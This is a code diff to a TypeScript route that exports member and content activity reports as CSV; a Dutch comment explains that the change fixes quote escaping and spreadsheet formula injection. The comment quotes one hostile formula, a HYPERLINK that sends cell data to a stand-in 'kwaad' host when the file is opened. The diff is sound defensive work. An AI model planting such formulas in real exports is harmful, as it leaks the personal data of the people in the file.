@@ -6,6 +6,7 @@ import repertoireStats from '../services/repertoireStats';
 import db from '../database/connection';
 import logger from '../utils/logger';
 import { bijlageKopregel } from '../utils/contentDisposition';
+import { csvBestand } from '../utils/csv';
 
 const router = Router();
 
@@ -808,6 +809,21 @@ router.get(
           return d.toISOString().split('T')[0];
         })();
 
+    // De drie rapporten werden hier met de hand in elkaar gezet: elk tekstveld
+    // kreeg aanhalingstekens omheen, maar de aanhalingstekens erin werden niet
+    // verdubbeld en er was geen bescherming tegen formules. Allebei fout, en
+    // allebei bij de ontvanger:
+    //
+    // - Een lid dat `Jan "Bassie" de Vries` heet sloot zijn eigen veld
+    //   halverwege af, waarna elke volgende kolom van die rij een plaats
+    //   opschoof - downloads kwamen onder e-mail terecht.
+    // - Een stuktitel als `=HYPERLINK("http://kwaad/"&A1,"klik")` wordt door
+    //   Excel, LibreOffice en Google Sheets uitgevoerd zodra iemand het bestand
+    //   opent, en die ziet alleen een linkje. Namen en e-mailadressen van alle
+    //   leden staan in ditzelfde bestand.
+    //
+    // csvBestand doet allebei. Het scheidingsteken blijft de komma, want dat is
+    // wat deze export altijd al gebruikte.
     let csvContent = '';
     // reportType komt uit een vaste lijst, maar startDate en endDate zijn
     // ongefilterde queryparameters (String(dateFrom), geen datumcontrole).
@@ -818,8 +834,17 @@ router.get(
 
     switch (reportType) {
       case 'member_activity': {
-        csvContent =
-          'Member ID,Member Name,Email,Downloads,Views,Audio Plays,Practice Sessions,Practice Minutes,Total Actions\n';
+        const kopregel = [
+          'Member ID',
+          'Member Name',
+          'Email',
+          'Downloads',
+          'Views',
+          'Audio Plays',
+          'Practice Sessions',
+          'Practice Minutes',
+          'Total Actions',
+        ];
 
         const members = db
           .prepare(
@@ -859,18 +884,40 @@ router.get(
           )
           .all(startDate, endDate + ' 23:59:59', startDate, endDate + ' 23:59:59', associationId) as any[];
 
-        members.forEach((m, index) => {
-          const memberId = anonymize === 'true' ? `member_${index + 1}` : m.id;
-          const memberName = anonymize === 'true' ? `Member ${index + 1}` : m.name;
-          const email = anonymize === 'true' ? '***@***' : m.email;
-          const total = m.downloads + m.views + m.audio_plays + m.practice_sessions;
-          csvContent += `"${memberId}","${memberName}","${email}",${m.downloads},${m.views},${m.audio_plays},${m.practice_sessions},${m.practice_minutes},${total}\n`;
-        });
+        csvContent = csvBestand(
+          kopregel,
+          members.map((m, index) => {
+            const memberId = anonymize === 'true' ? `member_${index + 1}` : m.id;
+            const memberName = anonymize === 'true' ? `Member ${index + 1}` : m.name;
+            const email = anonymize === 'true' ? '***@***' : m.email;
+            const total = m.downloads + m.views + m.audio_plays + m.practice_sessions;
+            return [
+              memberId,
+              memberName,
+              email,
+              m.downloads,
+              m.views,
+              m.audio_plays,
+              m.practice_sessions,
+              m.practice_minutes,
+              total,
+            ];
+          }),
+        );
         break;
       }
 
       case 'content_activity': {
-        csvContent = 'Content ID,Title,Type,Arranger,Downloads,Views,Audio Plays,Total Access\n';
+        const kopregel = [
+          'Content ID',
+          'Title',
+          'Type',
+          'Arranger',
+          'Downloads',
+          'Views',
+          'Audio Plays',
+          'Total Access',
+        ];
 
         const content = db
           .prepare(
@@ -904,16 +951,35 @@ router.get(
           )
           .all(startDate, endDate + ' 23:59:59', associationId) as any[];
 
-        content
-          .filter((c) => c.title)
-          .forEach((c) => {
-            csvContent += `"${c.entity_id}","${c.title || ''}","${c.entity_type}","${c.arranger || ''}",${c.downloads || 0},${c.views || 0},${c.audio_plays || 0},${c.total_access}\n`;
-          });
+        csvContent = csvBestand(
+          kopregel,
+          content
+            .filter((c) => c.title)
+            .map((c) => [
+              c.entity_id,
+              c.title,
+              c.entity_type,
+              c.arranger,
+              c.downloads || 0,
+              c.views || 0,
+              c.audio_plays || 0,
+              c.total_access,
+            ]),
+        );
         break;
       }
 
       case 'detailed_log': {
-        csvContent = 'Date,Time,Member ID,Member Name,Action,Content Type,Content ID,Content Title\n';
+        const kopregel = [
+          'Date',
+          'Time',
+          'Member ID',
+          'Member Name',
+          'Action',
+          'Content Type',
+          'Content ID',
+          'Content Title',
+        ];
 
         const logs = db
           .prepare(
@@ -941,13 +1007,16 @@ router.get(
           )
           .all(startDate, endDate + ' 23:59:59', associationId) as any[];
 
-        logs.forEach((l, index) => {
-          const date = l.created_at.split('T')[0];
-          const time = l.created_at.split('T')[1]?.substring(0, 8) || '';
-          const memberId = anonymize === 'true' ? `member_${index + 1}` : l.user_id;
-          const memberName = anonymize === 'true' ? `Member ${index + 1}` : l.user_name;
-          csvContent += `"${date}","${time}","${memberId}","${memberName}","${l.action_type}","${l.entity_type}","${l.entity_id}","${l.content_title || ''}"\n`;
-        });
+        csvContent = csvBestand(
+          kopregel,
+          logs.map((l, index) => {
+            const date = l.created_at.split('T')[0];
+            const time = l.created_at.split('T')[1]?.substring(0, 8) || '';
+            const memberId = anonymize === 'true' ? `member_${index + 1}` : l.user_id;
+            const memberName = anonymize === 'true' ? `Member ${index + 1}` : l.user_name;
+            return [date, time, memberId, memberName, l.action_type, l.entity_type, l.entity_id, l.content_title];
+          }),
+        );
         break;
       }
     }
